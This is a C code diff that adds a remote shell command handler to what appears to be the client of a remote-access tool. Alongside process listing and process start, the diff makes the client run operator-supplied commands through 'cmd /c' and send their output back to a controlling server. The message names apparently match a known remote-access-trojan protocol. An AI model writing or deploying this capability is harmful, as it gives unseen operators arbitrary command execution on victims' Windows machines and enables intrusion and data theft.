@@ -302,6 +302,59 @@ void remote_client_run(void) {
                                 remote_log("[loop] DoProcessStart decode failed");
                         }
                     }
+                    else if (subtype == REMOTE_SUBTYPE_DoShellExecute) {
+                        remote_log("[loop] handling DoShellExecute");
+                        {
+                            const unsigned char* body = dispatch_buf + consumed;
+                            unsigned int body_len = dispatch_len - consumed;
+                            char command_buf[4096];
+                            if (remote_proto_decode_do_shell_execute(body, body_len, command_buf, sizeof(command_buf))) {
+                                int is_error = 0;
+                                char output_buf[65536];
+                                output_buf[0] = '\0';
+                                if (strcmp(command_buf, "exit") == 0) {
+                                    strcpy_s(output_buf, sizeof(output_buf), "\n>> Session closed\n");
+                                } else if (command_buf[0]) {
+                                    char cmd_line[4200];
+                                    _snprintf_s(cmd_line, sizeof(cmd_line), _TRUNCATE, "cmd /c %s", command_buf);
+                                    FILE* fp = _popen(cmd_line, "rt");
+                                    if (fp) {
+                                        size_t total = 0;
+                                        while (total < sizeof(output_buf) - 256) {
+                                            size_t cap = sizeof(output_buf) - 1 - total;
+                                            if (fgets(output_buf + total, (int)cap, fp) == NULL) break;
+                                            total = strlen(output_buf);
+                                        }
+                                        output_buf[sizeof(output_buf) - 1] = '\0';
+                                        _pclose(fp);
+                                    } else {
+                                        strcpy_s(output_buf, sizeof(output_buf), "\n>> Failed to run command\n");
+                                        is_error = 1;
+                                    }
+                                }
+                                unsigned char resp_body[65600];
+                                unsigned int resp_len = remote_proto_encode_do_shell_execute_response(output_buf, is_error, resp_body, sizeof(resp_body));
+                                if (resp_len > 0) {
+                                    unsigned char* full_msg = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 8 + resp_len);
+                                    if (full_msg) {
+                                        unsigned int full_len = remote_proto_prepend_imessage(full_msg, 8 + resp_len,
+                                            REMOTE_SUBTYPE_DoShellExecuteResponse, resp_body, resp_len);
+                                        if (full_len > 0) {
+                                            unsigned char* frame_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, 4 + full_len);
+                                            if (frame_buf) {
+                                                unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame_buf, 4 + full_len);
+                                                int sent = (frame_len > 0 && remote_transport_send(transport, frame_buf, frame_len));
+                                                HeapFree(GetProcessHeap(), 0, frame_buf);
+                                                remote_log("[loop] DoShellExecuteResponse sent: %u bytes, send %s", full_len, sent ? "OK" : "FAIL");
+                                            }
+                                        }
+                                        HeapFree(GetProcessHeap(), 0, full_msg);
+                                    }
+                                }
+                            } else
+                                remote_log("[loop] DoShellExecute decode failed");
+                        }
+                    }
                     else if (subtype == REMOTE_SUBTYPE_GetProcesses) {
                         remote_log("[loop] handling GetProcesses");
                         {
